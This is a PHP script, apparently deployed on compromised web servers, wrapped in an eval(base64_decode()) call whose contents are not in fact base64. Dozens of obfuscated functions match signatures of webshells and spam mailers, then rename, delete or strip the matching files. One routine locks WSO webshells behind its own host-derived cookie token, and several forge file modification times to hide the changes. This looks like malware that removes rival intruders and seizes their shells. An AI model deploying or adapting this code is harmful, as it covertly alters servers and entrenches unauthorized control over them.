eval(base64_decode("function rixs($content)
{
if (strpos($content, " = mail(\$_POST[") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(base64_decode(") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(stripslashes(\$") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(stripslashes(\$") !== FALSE)
{
    return TRUE;
}

if (strpos($content, "mail") !== FALSE && substr_count($content, "stripslashes(base64_decode(\$_POST[") == 4)
{
    return TRUE;
}

if (strpos($content, "eval(\"return eval(\"\$code\");\") ?>") !== FALSE)
{
    return TRUE;
}

if (strpos($content, "if(isset(\$_POST[\"msgbody\"]))") !== FALSE && strpos($content, "if(isset(\$_POST[\"msgsubject\"]))") !== FALSE)
{
    return TRUE;
}


return FALSE;
}
function gsic($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rloa($content)
{
if (strpos($content, "imx1.rambler.ru,rambler") !== FALSE || strpos($content, "    'gmail-smtp-in.l.google.com',") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gbstmhbh($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rmytomcjeh($content)
{
if (strpos($content, "eval") !== FALSE)
{
    $brace1 = substr_count($content, "{");
    $brace2 = substr_count($content, "(");
    if (($brace1 == 3 || $brace1 == 2) && ($brace2 == 6 || $brace2 == 4))
    {
        return TRUE;
    }
}

return FALSE;
}
function gysvurorogk($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rjdwezzymj($content)
{
if (strpos($content, "eval(base64_decode(\$_POST[") !== FALSE)
{
    $brace2 = substr_count($content, "(");
    if ($brace2 == 2)
    {
        return TRUE;
    }
}

return FALSE;
}
function gakw($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rlmfbgkvnaz($content)
{
if (strpos($content, "']; eval(\$") !== FALSE)
{
    $brace1 = substr_count($content, "{");
    $brace2 = substr_count($content, "(");
    if ($brace1 == 2 && $brace2 == 10)
    {
        return TRUE;
    }
}

return FALSE;
}
function gqpejnlot($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rsxfmmli($content)
{
if (strpos($content, ")));}eval(") !== FALSE)
{
    $brace2 = substr_count($content, "(");
    if ($brace2 == 11)
    {
        return TRUE;
    }
}

return FALSE;
}
function gyquzregh($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rvoyzpynzmq($content)
{
if (strpos($content, "mail(\$") !== FALSE)
{
    $brace2 = substr_count($content, "(");
    if ($brace2 == 10)
    {
        return TRUE;
    }
}

return FALSE;
}
function gzavpbirl($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rxpz($content)
{
if (strpos($content, "]); eval(\$") !== FALSE)
{
    $brace2 = substr_count($content, "(");
    if ($brace2 == 4)
    {
        return TRUE;
    }
}

return FALSE;
}
function glebs($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rhol($content)
{
if (strpos($content, "else \$values = \$this->macros_values(\$dm['name']);") !== FALSE)
{
    return TRUE;
}

return FALSE;

}
function gwrxfum($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rsbn($content)
{
if (strpos($content, "if(mail(\$MailTo,") !== FALSE)
{
    if (substr_count($content, ")") == 14)
    {
        return TRUE;
    }
}

return FALSE;
}
function gxsls($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function reemeh($content)
{
if (strpos($content, "\$result = mail(\$to") !== FALSE)
{
    if (substr_count($content, ")") == 2)
    {
        return TRUE;
    }
}

return FALSE;

}
function gtabfobbgaj($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rbyqxyrzee($content)
{
if (strpos($content, "\$telo_pisma_fail") !== FALSE)
{
    if (substr_count($content, "(\$") == 91)
    {
        return TRUE;
    }
}

if (strpos($content, "\$telo_pisma    = \$_POST[\"telo_pisma\"];") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function ggro($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rkanc($content)
{
if (strpos($content, ";eval(\$") !== FALSE)
{
    if (substr_count($content, ")") == 6)
    {
        return TRUE;
    }
}

return FALSE;
}
function gfryrhhh($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rsgxu($content)
{
if (substr_count($content, "      '") != 0 && substr_count($content, "      '") == substr_count($content, ".\n ") && strpos($content, "eval") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gmbkwqb($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rntrdypw($content)
{
if (strpos($content, "         exit;    ") !== FALSE)
{
    if (substr_count($content, ";         \$") == 10)
    {
        return TRUE;
    }
}

return FALSE;
}
function gvzh($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rxmu($content)
{
if (strpos($content, "<?php @eval(\$_POST[") !== FALSE)
{
    return TRUE;
}

return FALSE;

}
function gcpsvgs($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rvnfomuibs($content)
{
if (strpos($content, "@chr((\$h[\$e[\$o]]<<4)+(\$h[\$e[++\$o]") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gxitcpgpkew($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rbjxpro($content)
{
if (strpos($content, "eval(\"\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gzybvqmiq($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rcoocfsapm($content)
{
if (strpos($content, "} elseif(!empty(\$_POST[\"p1\"]) AND \$_POST[\"pass\"]") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gaeizndbn($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rbwxuffyn($content)
{
if (strpos($content, "|<SBODY>(.*)</SBODY>|imsU") !== FALSE && strpos($content, "Message-ID: <\".preg_replace(") !== FALSE)
{

    return TRUE;

}

return FALSE;

}
function giavoykml($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rbonoiumwb($content)
{
if (strpos($content, "\$url = \$urls[array_rand(\$urls)];") !== FALSE)
{
    return TRUE;
}


return FALSE;
}
function griem($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rxdrtq($content)
{
$sign = "<?php";
for ($i=0; $i<100; $i++) {$sign .= " ";}
$sign_pos = 0;
if (($sign_pos = strpos($content, $sign)) === FALSE)
{
    return FALSE;
}

$sign_pos_end = 0;
if (($sign_pos_end = strpos($content, "?>", $sign_pos)) === FALSE)
{
    return FALSE;
}

$content = substr($content, $sign_pos, $sign_pos_end-$sign_pos);

if (strpos($content, "eval") !== FALSE)
{
    $brace1 = substr_count($content, "{");
    $brace2 = substr_count($content, "(");
    if (($brace1 == 3 || $brace1 == 2) && ($brace2 == 6 || $brace2 == 4))
    {
        return TRUE;
    }
}

return FALSE;
}
function gwwbzmvg($path)
{
$content = @file_get_contents($path);
$sign = "<?php";
for ($i=0; $i<100; $i++) {$sign .= " ";}
$sign_pos = 0;
if (($sign_pos = strpos($content, $sign)) === FALSE)
{
    return;
}
$sign_pos_end = 0;
if (($sign_pos_end = strpos($content, "?>", $sign_pos)) === FALSE)
{
    return;
}
else
{
    $sign_pos_end = $sign_pos_end + 2;
}
$content2 = substr($content, $sign_pos, $sign_pos_end-$sign_pos);
@unlink($path);
@file_put_contents($path, str_replace($content2, "", $content));
}
function rpedp($content)
{
if (strpos($content, "http://www.fopo.com.ar/") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function geqpptkc($path)
{
return;
}
function rhsfxu($content)
{
if (strpos($content, "str_replace('[DOWNLOADLINK]','http://") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gimlsv($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rwfbhvotu($content)
{
$auth_token = md5(md5($_SERVER['HTTP_HOST']) . $_SERVER['HTTP_HOST'] . "salt1I*@#31RTds34+543sf");

$s1 = strpos($content, "'FilesMan'");
$s2 = strpos($content, "WSOsetcookie");

if (($s1 !== FALSE || $s2 !== FALSE) and strpos($content, $auth_token) === FALSE) 
{
    return TRUE;
}

return FALSE;
}
function gasvriwfzk($path)
{
$auth_token = md5(md5($_SERVER['HTTP_HOST']) . $_SERVER['HTTP_HOST'] . "salt1I*@#31RTds34+543sf");
$space_str = "";
for ($i=0; $i<512; $i++) {$space_str .= " ";}
$payload = "<" . "?php " . $space_str . " if (!isset(\$_COOKIE['[AUTH]'])) {header('HTTP/1.0 404 Not Found');exit;} ?> ";
$payload = str_replace('[AUTH]', $auth_token, $payload);
$data = @file_get_contents($path);

$mod_time = @stat($path);
@unlink($path);
@file_put_contents($path, $payload . $data);
if ($mod_time)
{
    @touch($path, $mod_time['mtime']);
}

}
function rcyqstrj($content)
{
if (strrpos($content, "\\x73\\x74\\x72\\x69\\x70\\x73\\x6C\\x61\\x73\\x68\\x65\\x73") !== FALSE && strrpos($content, "\\x6D\\x61\\x69\\x6C") !== FALSE)
{
    return TRUE;
}

return FALSE;

}
function gnragvy($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rmrsetqnoby($content)
{
if (substr_count($content, "'](\$GLOBALS['") == 4)
{
    return TRUE;
}

return FALSE;
}
function gmuobyf($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rhbn($content)
{
if (strpos($content, ")) { continue; } echo \$") !== FALSE && strpos($content, ") { break; } } return; } if (isset(\$") !== FALSE && strpos($content, ")) { continue; } if (@\$GLOBALS[") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gqcpqzffqtb($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rrayu($content)
{
if (strpos($content, "str_rot13('riny').'(\$www)', 'add');?>") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gagd($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rckpj($content)
{
if (strpos($content, "?>\r\n\r\n \r\n    \r\n                 ") !== FALSE && strpos($content, "<?php eval(eval(") !== FALSE)
{
    return TRUE;
}

return FALSE;

}
function gexxo($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function roiotg($content)
{
if (strpos($content, "?>\r\n\r\n \r\n    \r\n                 ") !== FALSE && strpos($content, "<?php \$code=base64_decode(") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gemlorw($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rgtpemxxqv($content)
{
if (strpos($content, "0777);") !== FALSE)
{
    $brace2 = substr_count($content, ")");
    if ($brace2 == 18 || $brace2 == 33 || $brace2 == 12)
    {
        return TRUE;
    }
}

return FALSE;
}
function ghwof($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rmgeclnfsq($content)
{
if (strpos($content, "] => 0)); if (") !== FALSE && strpos($content, ", SOL_SOCKET, SO_SNDTIMEO, ") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gdhrgrvdulv($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rsmtsdvtaqr($content)
{
if (substr_count($content, "if(") == 41 && substr_count($content, "else") == 13)
{
    return TRUE;
}

return FALSE;
}
function ggwldc($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rebchffymdr($content)
{
if (strpos($content, "; eval(base64_decode(\$") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gayqmcunrp($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rwko($content)
{
if (strpos($content, ");@file_put_contents(") !== FALSE && strpos($content, "));@unlink(") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gvgdpzijxpn($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rspe($content)
{
if (strpos($content, "<?php \$") !== FALSE && strpos($content, "  ,\"") !== FALSE && strpos($content, "\";\$") !== FALSE && strpos($content, "'\".\$") !== FALSE && substr_count($content, " = ") == 5)
{
    return TRUE;
}
}
function gwtksi($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function roxj($content)
{
if (strpos($content, "};eval(\$") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gxxy($path)
{
return;
}
function rmqfikzgmw($content)
{
if (strpos($content, "<?php @array_diff_ukey(@array(") !== FALSE || strpos($content, "][0](@array((string)\$_REQUEST[") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function geeb($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rbcsigmx($content)
{
if (strpos($content, "@assert(base64_decode(\$_REQUEST") !== FALSE)
{
    return TRUE;
}
return FALSE;

}
function ghbygf($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rhumk($content)
{
if (strpos($content, "if(stristr(\$result,\"INSERTED\")){echo \$result;curl_close") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function giqzprd($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rffqa($content)
{
if (substr_count($content, ".chr(") > 20 && substr_count($content, "\n") < 5)
{
    return TRUE;
}
return FALSE;
}
function goveyjwl($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rixha($content)
{
if (strpos($content, "<?if(\$_GET['mod']){if(\$_GET['mod']=='0XX'") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gyeeukx($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rtzkcyxh($content)
{
if (strpos($content, "<?php \$") !== FALSE && substr_count($content, ";") == 5 && substr_count($content, "=") == 2)
{
    return TRUE;
}

return FALSE;
}
function gsiozmth($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rvqc($content)
{
if (strrpos($content, "<?php \$") !== FALSE && strrpos($content, "move_uploaded_file") !== FALSE && substr_count($content, "elseif") == 18)
{
    return TRUE;
}
return FALSE;
}
function ghhw($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function ryyynfnr($content)
{
if (strrpos($content, "if(isset(\$_POST['email'])) {") !== FALSE && strrpos($content, "<h4>!PhpSend!</h4>") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gunnf($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rnfevfsmk($content)
{
if (strrpos($content, ".\"|\$pathToDor\"") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gkkoxl($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rseqrdvb($content)
{
if (strrpos($content, "\$patuka = str_replace(\$pat[count(\$pat)-1],\"\",\$patuka);") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gcdb($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rlgwbs($content)
{
if (strpos($content, "<!--checker_start") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gncvb($path)
{
$content = @file_get_contents($path);

$res = "";
$istart = strpos($content, "//istart");
if ($istart !== FALSE)
{
    $iend = strpos($content, "//iend", $istart);
    if ($iend !== FALSE)
    {
        $res = substr($content, 0, $istart) . substr($content, $iend + 6);
        $cutted = substr($content, $istart, $iend - $istart);
        if (strpos($cutted, "<!--checker_start") !== FALSE)
        {
            $file_time = @stat($path);
            if (!$file_time)
            {
                $file_time['mtime'] = time();
            }
            @chmod($path, 0777);
            @unlink($path);
            @file_put_contents($path, $res);

            @touch($path, $file_time['mtime']);
        }
    }
}
}
function roiw($content)
{
if (strpos($content, "@preg_replace('/(.*)/e', @\$_POST[") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function ggerg($path)
{
$content = @file_get_contents($path);

$res = "";
$istart = strpos($content, "@preg_replace");
if ($istart !== FALSE)
{
    $iend = strpos($content, ";", $istart);
    if ($iend !== FALSE)
    {
        $res = substr($content, 0, $istart) . substr($content, $iend + 1);

        $file_time = @stat($path);
        if (!$file_time)
        {
            $file_time['mtime'] = time();
        }
        @unlink($path);
        @file_put_contents($path, $res);

        @touch($path, $file_time['mtime']);
    }
}
}
function ruhuxeumadf($content)
{
if (strpos($content, "Location: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") !== FALSE) { return TRUE; } return FALSE;
}
function goebokfmq($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rxcnknn($content)
{
if (strpos($content, "=__FILE__;if (strlen(\$_") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gyxr($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function reglehg($content)
{
if (strpos($content, "\$O_xz=@gzinflate(strrev(\$M_ua));") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function ghmujs($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rqkgctoj($content)
{
if (strpos($content, "function EditHtaccess(\$fileData)") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gwhnpjwxuvg($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rrwio($content)
{
if (strpos($content, "');eval(\$") !== FALSE) { $brace2 = substr_count($content, "("); if ($brace2 == 7) { return TRUE; } } return FALSE;
}
function gjeakm($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function riuzqeg($content)
{
if (strpos($content, "<" . "?php eval(\$_POST") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gqvb($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rvcpotrg($content)
{
if (strpos($content, "<" . "?php preg_replace(") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gdngnym($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rqcwrednx($content)
{
if (strpos($content, "this-is-the-test-of-door") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function ghyobwrpbt($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rbbfmpv($content)
{
if (strpos($content, "\$wp__l_='base'.(128/2).'_de'.'code';\$wp__l_=\$wp__l_") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function ggcbsil($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
"));
